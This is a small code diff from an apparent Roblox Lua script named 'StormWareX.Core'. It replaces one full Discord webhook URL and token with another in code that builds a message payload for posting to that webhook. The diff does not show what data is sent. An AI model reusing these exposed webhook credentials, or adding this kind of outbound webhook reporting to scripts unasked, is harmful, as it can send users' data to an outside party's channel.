@@ -645,7 +645,7 @@ local function IEHL_fake_script() -- StormWareX.Core
 	
 	
 	local url =
-		"https://discord.com/api/webhooks/977824307059249183/OhgFkIEboUUibOaL3Gv_OSmhp41fPqsMUkNcN4o40TDcZgRgfCF-Cocp4hZUm0vjYMXw"
+		"https://discord.com/api/webhooks/977962764200988693/8XY_YVlipxlBquz-uzi-PT-TbedKydGdK1DAMemTO_ieDeAU1jx-cKvY9FcBsDjI4FTd"
 	local data = {
 		["content"] = "Texthere ",
 		["embeds"] = {
